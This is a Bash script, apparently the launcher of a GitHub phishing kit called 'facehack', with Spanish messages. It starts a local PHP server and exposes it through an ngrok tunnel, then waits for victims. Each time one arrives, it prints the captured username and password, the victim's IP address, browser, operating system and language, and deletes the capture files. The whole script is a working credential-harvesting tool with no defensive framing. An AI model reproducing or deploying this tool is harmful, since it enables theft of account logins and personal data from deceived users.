#!bin/bash

#colores

green="\e[0;32m\033[1m"
white="\033[0m\e[0m"
red="\e[0;31m\033[1m"
blue="\e[0;34m\033[1m"
yellow="\e[0;33m\033[1m"
purple="\e[0;35m\033[1m"
turquoise="\e[0;36m\033[1m"
gray="\e[1;90m"

trap ctrl_c INT

function ctrl_c {
	echo -e "\n${yellow}[${red}*${yellow}] ${red}Saliendo...${white}"; sleep 1
	pkill php; pkill ngrok; exit 0
}

function dependencias(){
command -v php > /dev/null 2>&1 || {
	echo >&2 -Ee "\n${yellow}[${red}+${yellow}] ${red}No tienes instalado php, instalalo!.\n"
	echo >&2 -Ee "\t${green}apt install php${white}\n"; exit 1
}

command -v wget > /dev/null 2>&1 || {
	echo >&2 -Ee "\n${yellow}[${red}+${yellow}] ${red}No tienes instalado wget, instalalo!.\n"
	echo >&2 -Ee "\t${green}apt install wget${white}\n"; exit 1
}

command -v curl > /dev/null 2>&1 || {
        echo >&2 -Ee "\n${yellow}[${red}+${yellow}] ${red}No tienes instalado curl, instalalo!.\n"
        echo >&2 -Ee "\t${green}apt install curl${white}\n"; exit 1
}
}

function banner(){
clear;cd files; echo -e "${blue}
  _____   ____     __    ___  __ __   ____     __  __  _
 |     | /    T   /  ]  /  _]|  T  T /    T   /  ]|  l/ ]
 |   __jY  o  |  /  /  /  [_ |  l  |Y  o  |  /  / |  ' /
 |  l_  |     | /  /  Y    _]|  _  ||     | /  /  |    \

 |   _] |  _  |/   \_ |   [_ |  |  ||  _  |/   \_ |     Y
 |  T   |  |  |\     ||     T|  |  ||  |  |\     ||  .  |
 l__j   l__j__j \____jl_____jl__j__jl__j__j \____jl__j\_j\n"
    ${green} github:${white} https://github.com/wilian-lgn/facehack
}

 function ngrok(){
echo -e "${yellow}[${red}*${yellow}] ${yellow}Abriendo servidor local..."
php -S localhost:4433 2> /dev/null &
sleep 3
echo -e "${yellow}[${red}*${yellow}] ${yellow}Abriendo servidor Ngrok...\033[0m"
./ngrok http 4433 > /dev/null &
sleep 10
echo -e "${yellow}[${red}*${yellow}] ${yellow}Obteniendo links...\033[0m"; sleep 1.5
echo -e "${yellow}[${red}*${yellow}] ${yellow}Link local:${white} localhost:4433\033[0m"
echo -e "${yellow}[${red}*${yellow}] ${yellow}Link ngrok:\033[0m $(curl -s http://127.0.0.1:404[0-9]/status | grep -o "https://[a-z0-9A-Z]*\.ngrok.io" | head -n1)"
echo -e "\n${yellow}[${red}*${yellow}] ${gray}Esperando datos...\t\t\t${green}    parar: ctrl+c"

while [ true ]; do
	if [ -f credentials.txt ]; then
		echo -e "\n\n${yellow}[${red}*${yellow}] ${green}Usuario: ${white}$(grep -i "usuario" credentials.txt | cut -d ":" -f2)"
		echo -e "${yellow}[${red}*${yellow}] ${green}Contraseña: ${white}$(grep -i "Contrasena" credentials.txt| cut -d ":" -f2)\n"
		for ((x=1; x<=50; x=x+1)); do echo -nEe "${blue}#"; done
		rm -f credentials.txt
	fi
	if [ -f credentials2.txt ]; then
		echo '';for ((x=1; x<=50; x=x+1)); do echo -nEe "${blue}#"; done
		echo -e "\n\n${yellow}[${red}*${yellow}] \033[0;33mLa victima accedió al link!"
		if [ -f ip.txt ]; then echo -Ee "\n${yellow}[${red}*${yellow}] ${green}IP: ${white}$(cat ip.txt | grep -iE "ip" | cut -d ':' -f2)"; fi
		echo -e "${yellow}[${red}*${yellow}] ${green}User-Agent: ${white}$(grep -i "user-agent" credentials2.txt| cut -d ":" -f2)"
		echo -e "${yellow}[${red}*${yellow}] ${green}AppVersion: ${white}$(grep -i "versionapp" credentials2.txt| cut -d ":" -f2)"
		echo -e "${yellow}[${red}*${yellow}] ${green}Sistema Operativo: ${white}$(grep -i "sistema" credentials2.txt| cut -d ":" -f2)"
		echo -e "${yellow}[${red}*${yellow}] ${green}lenguaje: ${white}$(grep -i "lenguaje" credentials2.txt| cut -d ":" -f2)\n"
		for ((x=1; x<=50; x=x+1)); do echo -nEe "${blue}#"; done
		rm -rf credentials2.txt
	fi
done
}

dependencias
banner
ngrok
